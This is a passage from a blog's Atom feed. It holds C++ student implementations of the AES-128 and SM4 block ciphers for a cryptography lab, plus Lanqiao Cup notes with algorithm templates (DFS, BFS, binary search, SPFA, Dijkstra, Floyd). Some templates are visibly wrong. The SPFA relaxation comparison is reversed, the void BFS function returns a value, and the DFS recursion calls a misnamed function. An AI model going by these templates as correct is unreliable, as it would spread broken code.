(Mul_02(x)<<24)|(x<<16)|(x<<8)|(x^ Mul_02(x));    //2113}uint32_t get_output_col2(uint8_t x){    x = (uint32_t)x;    return ((x^Mul_02(x))<<24)|(Mul_02(x)<<16)|(x<<8)|(x);    //3211}uint32_t get_output_col3(uint8_t x){    x = (uint32_t)x;    return (x<<24)|((x^Mul_02(x))<<16)|(Mul_02(x)<<8)|(x);    //1321}uint32_t get_output_col4(uint8_t x){    x = (uint32_t)x;    return (x<<24)|(x<<16)|((x^Mul_02(x))<<8)|(Mul_02(x));    //1132}void get_TAB(){    for(int i=0;i<4;i++) {        for (int j = 0; j < 256; j++) {            T[i][j]=0;        }    }    for(int i=0;i<256;i++) {        T[0][i] = get_output_col1((uint8_t) i);        T[1][i] = get_output_col2((uint8_t) i);        T[2][i] = get_output_col3((uint8_t) i);        T[3][i] = get_output_col4((uint8_t) i);    }    //输出列混淆表//    for(int i=0;i<4;i++) {//        for (int j = 0; j < 256; j++) {//            //printf("%8x ",T[i][j]);//            cout <<setw(8)<<setfill('0')<< hex << T[i][j] << " ";//        }//        cout<<endl;//    }}uint8_t GFMul(uint8_t a, uint8_t b) {    uint8_t p = 0;    uint8_t high;    for (int counter = 0; counter < 8; counter++)    {        if ((b & uint8_t(1)) != 0){//判断当前b的最后一位是否为0            p ^= a;}// p与a异或  即如果b当前最后一位不是0，就加上现在的a        high = (uint8_t) (a & uint8_t(0x80));//高4位，看是否会溢出，high=1就是溢出        a <<= 1;//a左移一位，即乘以2        if (high != 0){//发生溢出            a ^= 0x1b; }// x^8 + x^4 + x^3 + x + 1        b >>= 1;//右移，看b的下一位了    }    return p;}void KeyExpansion(uint8_t key[], uint32_t w[]){    int j=0;    uint32_t temp=0;    // w[]的前4个就是输入的key    //初始化w[0]->w[3]    for(int i=0; i<4;i++){        w[i] = (key[4*i]<<24)|(key[4*i+1]<<16)|(key[4*i+2]<<8)|(key[4*i+3]);        //printf("%d:%x\n",i,w[i]);    }    //创建w[4]->w[43]    for(int i=4; i<44;i++){        if(i%4==0){            temp = left_bit_move(w[i-1],8);//循环左移8位            temp =  SubKeys(temp);            w[i] = temp ^ w[i-4] ^ LunMiYaoJia[j++];            //printf("%d:%x\n",i,w[i]);        }        else {            w[i] = w[i - 1] ^ w[i - 4];            //printf("%d:%x\n",i,w[i]);        }    }}void AddRoundKey(uint8_t mtx[],uint32_t w[]){    for(int i=0; i<4; i++){        uint8_t w1 = w[i] >> 24 & 0xff;        uint8_t w2 = (w[i] >> 16) & 0xff;        uint8_t w3 = (w[i] >> 8) & 0xff;        uint8_t w4 = (w[i]) & 0xff;        mtx[i] ^= w1;  //按列异或        mtx[i+4] ^= w2;        mtx[i+8] ^= w3;        mtx[i+12] ^= w4;    }}//  S盒密钥变换 - 前4位为行号，后4位为列号uint32_t SubKeys(uint32_t temp){    uint8_t w[4] = {0};    int j=0;    //循环4次    for(int i=3; i>=0; i--){        w[j++] = (temp>>(i*8))&0xff;    }    SubBytes(w,4);    return (w[0]<<24|w[1]<<16|w[2]<<8|w[3]);}//  S盒变换 - 前4位为行号，后4位为列号void SubBytes(uint8_t mtx[],int len){    for(int i=0; i<len; ++i)    {        int row = ((mtx[i]>>7)&0x1)*8 + ((mtx[i]>>6)&0x1)*4 + ((mtx[i]>>5)&0x1)*2 + ((mtx[i]>>4)&0x1)*1;    //第4 5 6 7位确定行        int col = ((mtx[i]>>3)&0x1)*8 + ((mtx[i]>>2)&0x1)*4 + ((mtx[i]>>1)&0x1)*2 + (mtx[i]&0x1)*1;       //第0 1 2 3位确定列        mtx[i] = S_Box[row][col];    }}void InvSubBytes(uint8_t mtx[],int len){    for(int i=0; i<len; ++i)    {        int row = ((mtx[i]>>7)&0x1)*8 + ((mtx[i]>>6)&0x1)*4 + ((mtx[i]>>5)&0x1)*2 + ((mtx[i]>>4)&0x1)*1;    //第4 5 6 7位确定行        int col = ((mtx[i]>>3)&0x1)*8 + ((mtx[i]>>2)&0x1)*4 + ((mtx[i]>>1)&0x1)*2 + (mtx[i]&0x1)*1;       //第0 1 2 3位确定列        mtx[i] = Inv_S_Box[row][col];    }}//行移位void ShiftRows(uint8_t mtx[]){    uint8_t temp=mtx[4];    //第二行左移一位    for(int i=0; i<3; i++){        mtx[i+4] = mtx[i+5];    }    mtx[7] = temp;    //第三行左移二位    for(int i=0; i<2; i++){        temp = mtx[i+8];        mtx[i+8] = mtx[i+10];        mtx[i+10] = temp;    }    //第四行左移三位    temp = mtx[15];    for(int i=3; i>0; i--) {        mtx[i + 12] = mtx[i + 11];    }    mtx[12] = temp;}void InvShiftRows(uint8_t mtx[]){    // 第二行循环右移一位    uint8_t temp = mtx[7];    for(int i=3; i>0; --i)        mtx[i+4] = mtx[i+3];    mtx[4] = temp;    // 第三行循环右移两位    for(int i=0; i<2; ++i)    {        temp = mtx[i+8];        mtx[i+8] = mtx[i+10];        mtx[i+10] = temp;    }    // 第四行循环右移三位    temp = mtx[12];    for(int i=0; i<3; ++i)        mtx[i+12] = mtx[i+13];    mtx[15] = temp;}void MixColumns(uint8_t c[]){    uint32_t total[4]={0};  //存储每一列取出的4个32比特字节异或的结果，即列混淆后的第i列    uint32_t temp[16]={0};  //存储16个 每个字节从T表得到的32比特的4字节一列    for(int i=0;i<16;i++){        temp[i] = T[i/4][c[i]];    }    for(int i=0; i<4;i++) {        total[i] = temp[i] ^ temp[i+4] ^ temp[i+8] ^ temp[i+12];        c[i] = (total[i]>>24)&0xff;        c[i+4]=(total[i]>>16)&0xff;        c[i+8] = (total[i]>>8)&0xff;        c[i+12] = (total[i])&0xff;    }}void InvMixColumns(uint8_t mtx[]){    uint8_t arr[4];    for(int i=0; i<4; ++i) {        for (int j = 0; j < 4; ++j)            arr[j] = mtx[i + j * 4];        mtx[i] = GFMul(0x0e, arr[0]) ^ GFMul(0x0b, arr[1]) ^ GFMul(0x0d, arr[2]) ^ GFMul(0x09, arr[3]);        mtx[i + 4] = GFMul(0x09, arr[0]) ^ GFMul(0x0e, arr[1]) ^ GFMul(0x0b, arr[2]) ^ GFMul(0x0d, arr[3]);        mtx[i + 8] = GFMul(0x0d, arr[0]) ^ GFMul(0x09, arr[1]) ^ GFMul(0x0e, arr[2]) ^ GFMul(0x0b, arr[3]);        mtx[i + 12] = GFMul(0x0b, arr[0]) ^ GFMul(0x0d, arr[1]) ^ GFMul(0x09, arr[2]) ^ GFMul(0x0e, arr[3]);    }}void Encrypt(uint8_t m[],uint32_t key[],uint8_t c[]){    //首先进行开始的轮密钥加    int round=0;    uint32_t w[4]={0};    for(int k=0; k<4; k++)        w[k] = key[4*round+k];    for(int i=0; i<16; i++)        c[i] = m[i];    AddRoundKey(c,w);    //接下来是9轮一摸一样的函数    for(int i = 1;i<=9;i++)    {        SubBytes(c,16);//字节替代        ShiftRows(c);//行移位        MixColumns(c);//列混淆        round++;        //cout<<"轮数"<<round<<endl;        for(int k=0; k<4; k++) {            w[k] = key[4 * round + k];        }        AddRoundKey(c,w);//轮密钥加    }    //最后一轮    round++;    //cout<<"轮数"<<round<<endl;    for(int k=0; k<4; k++) {        w[k] = key[4 * round + k];        //("%x ",w[k]);    }    SubBytes(c,16);//字节替代    ShiftRows(c);//行移位    AddRoundKey(c,w);//轮密钥加}void Decrypt(uint8_t c[],uint32_t key[],uint8_t m[]){    //首先进行开始的轮密钥加    //注意密钥反着来    int round=10;    uint32_t w[4]={0};    for(int k=0; k<4; k++)        w[k] = key[4*round+k];  //密钥赋值    for(int i=0; i<16; i++)        m[i] = c[i];    AddRoundKey(m,w);    //接下来是9轮一摸一样的函数    for(int i = 1;i<=9;i++)    {        InvShiftRows(m);//行移位        InvSubBytes(m,16);//字节替代        round--;        //cout<<"轮数"<<round<<endl;        for(int k=0; k<4; k++) {            w[k] = key[4 * round + k];        }        AddRoundKey(m,w);//轮密钥加        InvMixColumns(m);//列混淆    }    //最后一轮    round--;    //cout<<"轮数"<<round<<endl;    for(int k=0; k<4; k++) {        w[k] = key[4 * round + k];        //("%x ",w[k]);    }    InvShiftRows(m);//行移位    InvSubBytes(m,16);//字节替代    AddRoundKey(m,w);//轮密钥加}void Display(uint8_t Matrix[]){    for(int i=0; i<16; i++) {        printf("%x ", Matrix[i]);        if(i%4==3)            cout<<endl;    }}void DisplayKeys(uint32_t Matrix[]){    for(int i=0; i<44; i++) {        printf("第%d列:%x\n",i,Matrix[i]);    }}int main(){    string mingwen;    string miwen;    uint8_t key[16]={0};    uint8_t m[16]={0};    cout<<"请输入明文(128bits):";    cin>>mingwen;    cout<<"请输入密文(128bits):";    cin>>miwen;    for(int i=0;i<16;i++)    {        m[i] = (uint8_t)(mingwen[i]);        key[i] = (uint8_t)(miwen[i]);    }    uint8_t c[16]={0};    uint8_t x[16]={0};    uint32_t new_key[44]={0};   //存储44列密钥    cout<<"明文:"<<endl;    Display(m);    cout<<"密钥:"<<endl;    Display(key);    get_TAB();//生成列混淆表    KeyExpansion(key,new_key);    cout<<"生成密钥"<<endl;    //DisplayKeys(new_key);    Encrypt(m,new_key,c);    cout<<"加密结果"<<endl;    Display(c);    Decrypt(c,new_key,x);    cout<<"解密结果(hex)"<<endl;    Display(x);    cout<<"解密结果(string)"<<endl;    for(int i=0;i<16;i++)        cout<<(char)x[i];    return 0;}</code></pre><h2 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h2><pre class=" language-c++"><code class="language-c++">#include "string.h"#include<iostream>#include <stdint.h>#include<string>using namespace std;uint32_t shift_l(uint32_t s,int n)//循环左移n位{    int size=sizeof (s)*8;      //字节数乘以8代表一共多少位    return s<<(n)|(s>>size-n);}uint32_t Sb(uint32_t s) {    uint8_t SboxTable[16][16] =            {                    {0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05},                    {0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99},                    {0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62},                    {0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6},                    {0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8},                    {0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35},                    {0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87},                    {0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e},                    {0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1},                    {0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3},                    {0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f},                    {0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51},                    {0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8},                    {0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0},                    {0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84},                    {0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48}};    uint8_t a[4];    a[0]=(s>>24)&0xff;     //最高8位    a[1]=(s>>16)&0xff;    a[2]=(s>>8)&0xff;    a[3]=s&0xff;    uint8_t b[4];    for(int i=0;i<4;i++) {        int row = ((a[i] >> 7) & 1) * 8 + ((a[i] >> 6) & 1) * 4 + ((a[i] >> 5) & 1) * 2 + ((a[i] >> 4) & 1) * 1;        int col = ((a[i] >> 3) & 1) * 8 + ((a[i] >> 2) & 1) * 4 + ((a[i] >> 1) & 1) * 2 + ((a[i]) & 1) * 1;        b[i] = SboxTable[row][col];    }    uint32_t result;    result=(b[0]<<24)|(b[1]<<16)|(b[2]<<8)|b[3];    return result;}uint32_t L_change(uint32_t s){    return s^ shift_l(s,13)^ shift_l(s,23);}uint32_t T_change(uint32_t s){    return L_change(Sb(s));}void keyexpand(uint32_t MK[4],uint32_t rk[32]){    uint32_t FK[4]={0xA3B1BAC6, 0x56AA3350,0x677D9197, 0xB27022DC};    uint32_t CK[32] = { 0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,                        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,                        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,                        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,                        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,                        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,                        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,                        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279 };    uint32_t k[4]={MK[0]^FK[0],MK[1]^FK[1],MK[2]^FK[2],MK[3]^FK[3]};    uint32_t K[36];    for(int i=0;i<=3;i++)        K[i]=k[i];    for(int i=0;i<32;i++)    {        K[i+4]=K[i]^ T_change(K[i+1]^K[i+2]^K[i+3]^CK[i]);    }    for(int i=0;i<32;i++)        rk[i]=K[i+4];}uint32_t Lchange(uint32_t s){    return s^shift_l(s,2)^shift_l(s,10)^shift_l(s,18)^shift_l(s,24);}uint32_t Tchange(uint32_t s){    return Lchange(Sb(s));}uint32_t fround(uint32_t X[4],uint32_t rk){    uint32_t B=X[1]^X[2]^X[3]^rk;    return X[0]^ L_change(Sb(B));}static uint32_t out1[4];void SM4(uint32_t X[4],uint32_t rk[32]){    uint32_t Y[36];    Y[0]=X[0];    Y[1]=X[1];    Y[2]=X[2];    Y[3]=X[3];    for(int i=0;i<=31;i++) {        Y[i + 4] = Y[i] ^ Tchange(Y[i + 1] ^ Y[i + 2] ^ Y[i + 3] ^ rk[i]);    }//    for(int i=0;i<36;i++) {//        printf("第%d轮:%x \n",i,Y[i]);//    }    out1[0]=Y[35];    out1[1]=Y[34];    out1[2]=Y[33];    out1[3]=Y[32];}static uint32_t out2[4];void sm4(uint32_t Y[4],uint32_t rk[32]){    uint32_t X[36];    X[35]=Y[0];    X[34]=Y[1];    X[33]=Y[2];    X[32]=Y[3];    for(int i=31;i>=0;i--)    {        X[i]=X[i+4]^ Tchange(X[i+3]^X[i+2]^X[i+1]^rk[i]);    }    out2[0]=X[0];    out2[1]=X[1];    out2[2]=X[2];    out2[3]=X[3];}int main() {    uint32_t ming[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};    cout<<"明文:"<<endl;    for(int i=0;i<4;i++)        cout<<hex<<ming[i]<<" ";    cout<<endl;    uint32_t MK[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};    cout<<"密钥："<<endl;    for(int i=0;i<4;i++)        cout<<hex<<MK[i]<<" ";    cout<<endl;    uint32_t rk[32];    keyexpand(MK,rk);//    cout<<"扩展密钥："<<endl;//    for(int i=0;i<32;i++)//        cout<<i<<"轮扩展密钥"<<rk[i]<<endl;    cout<<"加密结果："<<endl;    SM4(ming,rk);    for(int i=0;i<4;i++)        cout<<out1[i]<<" ";    cout<<endl;    cout<<"解密结果:"<<endl;    sm4(out1,rk);    for(int i=0;i<4;i++)        cout<<out2[i]<<" ";    cout<<endl;    return 0;}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;DES&quot;&gt;&lt;a href=&quot;#DES&quot; class=&quot;headerlink&quot; title=&quot;DES&quot;&gt;&lt;/a&gt;DES&lt;/h2&gt;&lt;pre class=&quot; language-C++&quot;&gt;&lt;code class=&quot;language-C++&quot;&gt;#include &lt;bits/</summary>
      
    
    
    
    
    <category term="密码学实验代码集合" scheme="https://kylinxin.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81%E9%9B%86%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title>蓝桥杯</title>
    <link href="https://kylinxin.github.io/2023/04/10/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>https://kylinxin.github.io/2023/04/10/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-05-05T12:05:49.135Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="救赎"><a href="#救赎" class="headerlink" title="救赎"></a>救赎</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="1-欧几里得辗转相除法-求解-最大公约数-最小公倍数"><a href="#1-欧几里得辗转相除法-求解-最大公约数-最小公倍数" class="headerlink" title="1.欧几里得辗转相除法 求解 最大公约数 最小公倍数"></a>1.欧几里得辗转相除法 求解 最大公约数 最小公倍数</h3><pre class=" language-c++"><code class="language-c++">int gcd(int a, int b){return b == 0 ? a : gcd(b, a % b);}int lcm(int a, int b){return a / gcd(a, b) * b;}</code></pre><h3 id="2-求质数"><a href="#2-求质数" class="headerlink" title="2.求质数"></a>2.求质数</h3><pre class=" language-c++"><code class="language-c++">/* 判断素数 */bool isPrime(LL n) {    for (int i = 2; i * i <= n; ++i)        if (n % i == 0)            return false;    return true;}</code></pre><h3 id="3-栈"><a href="#3-栈" class="headerlink" title="3.栈"></a>3.栈</h3><pre class=" language-c++"><code class="language-c++">#include <stack>stack<类型> mystack;s.empty();         //如果栈为空则返回true, 否则返回false;s.size();          //返回栈中元素的个数s.top();           //返回栈顶元素, 但不删除该元素s.pop();           //弹出栈顶元素, 但不返回其值s.push();          //将元素压入栈顶</code></pre><h3 id="4-队列"><a href="#4-队列" class="headerlink" title="4.队列"></a>4.队列</h3><pre class=" language-c++"><code class="language-c++">#include <queue>queue<类型> myqueue;push() //在队尾插入一个元素pop() //删除队列第一个元素size() //返回队列中元素个数empty() //如果队列空则返回truefront() //返回队列中的第一个元素back() //返回队列中最后一个元素</code></pre><h3 id="5-DFS-深度优先"><a href="#5-DFS-深度优先" class="headerlink" title="5.DFS(深度优先)"></a>5.DFS(深度优先)</h3><pre class=" language-c++"><code class="language-c++">int dx[4] = {0,0,-1,1};int dy[4] = {-1,1,0,0};int mp[N][N];//存放迷宫int vis[N][N];//表示是否访问过，初始为flasevoid DFS(int x, int y)//x,y是坐标点的位置 {    if(vis[x][y] || (x==n && y==n)) return; //表示已经访问过了或者到达终点,递归的出口    vis[x][y] = true; //表示没有访问过，现在正在访问，置为访问过    for(int i=0; i < 4; i++){//遍历四个方向，顺序依次是，上下左右        int nx = x + dx[i];        int ny = y + dy[i];      //进行了合法性检验，      //1.首先判断了该点是否越界，即是否在迷宫内  nx > 0 && nx <= n && ny > 0 && ny <= n      //2.然后判断是否访问过  !vis[nx][ny] 未访问过就继续      //3.最后判断是否为路  mp[nx][ny] == '0' 为路就继续        if(nx > 0 && nx <= n && ny > 0 && ny <= n && !vis[nx][ny] && mp[nx][ny] == '0')            dfs(nx,ny);    } }//注意!! 应该判断一下起点是否可走</code></pre><h3 id="6-BFS-广度优先搜索"><a href="#6-BFS-广度优先搜索" class="headerlink" title="6.BFS(广度优先搜索)"></a>6.BFS(广度优先搜索)</h3><pre class=" language-c++"><code class="language-c++">int X[4]={0, 0, -1, 1};int Y[4]={-1, 1, 0, 0};int matrix[N][N]; //存储迷宫信息int vis[N][N];//存储每个状态点是否走过struct node{    int x;    int y;}Node, top;bool judge(int xx, int yy){    if(xx<0||yy<0||xx>=N||yy>=N) //注意边界        return false;    if(vis[xx][yy]==true||matrix[xx][yy]==0)//下一个点走过或者为墙 0不能走，1能走        return false;    return true;}void BFS(int x, int y){    queue<node> q;    Node.x=x;    Node.y=y;    q.push(Node);//将起点入队列    while(!q.empty())//队列不空就扩散    {        top=q.front();//取出队首元素        int nx=top.x;        int ny=top.y;//从四个方面机进行扩散         if(nx == ex && ny == ey) //找到终点             return top;        for(int i=0; i<4; i++)        {            if(judge(nx+X[i], ny+Y[i])) //检查四个方向，如果有路就进队列            {                Node.x=nx+X[i];                Node.y=ny+Y[i];                q.push(Node);            }        }        ans++;//计数器        vis[nx][ny]=true;        q.pop();//表示这个点的邻接点已经全部入队列，丢弃这个点    }}</code></pre><h3 id="7-二分模板"><a href="#7-二分模板" class="headerlink" title="7.二分模板"></a>7.二分模板</h3><pre class=" language-c++"><code class="language-c++">/*    作者:FengBOOOOOOOOOOOOOOO    二分模板返回大于x的第一个位置    */#include<cstdio>#include<algorithm>#include<cstring>#define N 1005using namespace std;int a[N],n,q;int find(int l,int r,int key)//l为-1，r为数组长度{    while(l + 1 < r)    {        int mid = l + r>>1;        if(a[mid] <= key)        　　l = mid;        else        　　r = mid;    }    return r;//返回大于Key的第一个位置}int main(){    int k;    scanf("%d%d",&n,&q);    for(int i = 0; i < n; ++i)    　　scanf("%d",&a[i]);    for(int i = 0; i < q; ++i)    {        scanf("%d",&k);        printf("%d\n",find(-1,n,k));    }} </code></pre><h2 id="最短路径问题"><a href="#最短路径问题" class="headerlink" title="最短路径问题"></a>最短路径问题</h2><h3 id="1-SPFA最短路径-类似与BFS"><a href="#1-SPFA最短路径-类似与BFS" class="headerlink" title="1.SPFA最短路径(类似与BFS)"></a>1.SPFA最短路径(类似与BFS)</h3><pre class=" language-c++"><code class="language-c++">#include <iostream>#include <string.h>#include <stdio.h>#include <algorithm>#include <queue>#include <vector>#define ll long long#define inf 0x3f3f3f3f#define pii pair<int, int>const int mod = 1e9+7;const int maxn = 2e5+7;using namespace std;struct node {int to,w,next;} edge[maxn];int head[maxn], cnt;int dis[maxn], vis[maxn];int n, m, s, t;struct Spfa{    void init()    {        memset(head,-1,sizeof(head));        memset(dis,0x3f3f3f3f,sizeof(dis));        memset(vis,0,sizeof(vis));        cnt = 0;    }     void add(int u,int v,int w)    {        edge[cnt].to = v;        edge[cnt].w = w;        edge[cnt].next = head[u];        head[u] = cnt ++;    }     void spfa()    {        dis[s] = 0; vis[s] = 1;        queue <int> Q; Q.push(s);        while(!Q.empty())        {            int now = Q.front();            Q.pop(); vis[now] = 0;    //从队列中弹出now , vis[now] 标记为未访问            for(int i = head[now]; i != -1; i = edge[i].next)            {                int v = edge[i].to;                if(dis[v] < dis[now] + edge[i].w)                {                    dis[v] = dis[now] + edge[i].w;                    if(vis[v]) continue;    //如果访问过了(也就是 已经在队列中),就不用再push                    vis[v] = 1; Q.push(v);                }            }        }    }}sp; int main(){    while(~scanf("%d%d",&n,&m) && n+m)    {        sp.init();        for(int i = 0; i < m; i++)        {            int u, v, w;            scanf("%d%d%d",&u, &v, &w);            sp.add(u, v, w);            sp.add(v, u, w);        }        s = 1, t = n; //s起点，t终点        sp.spfa();        printf("%d\n", dis[t]);    }}</code></pre><h3 id="2-Dijkstra"><a href="#2-Dijkstra" class="headerlink" title="2.Dijkstra"></a>2.Dijkstra</h3><pre class=" language-c++"><code class="language-c++">//主要思想一个大循环+两个小循环void dijkstra(){    int u, minx;    book[S] = 1;    for(int i = 0; i < N; i++){    //dist[]数组初始化，把起始结点S到i结点的距离赋值给diat[i]        dist[i] = v[S][i];    }    for(int i = 0; i < N; i++){//大循环        minx = INT_MAX;        for(int j = 0; j < N; j++){//寻找没有被标记并且最短的路径，并记录此结点             if(!book[j] && minx > dist[j]){                minx = dist[j];                u = j;            }         }        book[u] = 1;        for(int k = 0; k < N; k++){        //如果A到B的距离大于A到C的距离加C到B的距离，那么更新数据            if(!book[k] && dist[k] > dist[u]+v[u][k]){                dist[k] = dist[u]+v[u][k];            }        }    }}</code></pre><h3 id="3-Floyd"><a href="#3-Floyd" class="headerlink" title="3.Floyd"></a>3.Floyd</h3><pre class=" language-c++"><code class="language-c++">//初始化：    for (int i = 1; i <= n; i ++ )        for (int j = 1; j <= n; j ++ )            if (i == j) d[i][j] = 0;            else d[i][j] = INF;// 算法结束后，d[a][b]表示a到b的最短距离void floyd(){    for (int k = 1; k <= n; k ++ )        for (int i = 1; i <= n; i ++ )            for (int j = 1; j <= n; j ++ )                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h1 id=&quot;救赎&quot;&gt;&lt;a href=&quot;#救赎&quot; class=&quot;headerlink&quot; title=&quot;救赎&quot;&gt;&lt;/a&gt;救赎&lt;/h1&gt;&lt;h2 id=&quot;基础知识&quot;&gt;</summary>
      
    
    
    
    
    <category term="蓝桥杯刷题总结" scheme="https://kylinxin.github.io/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
</feed>
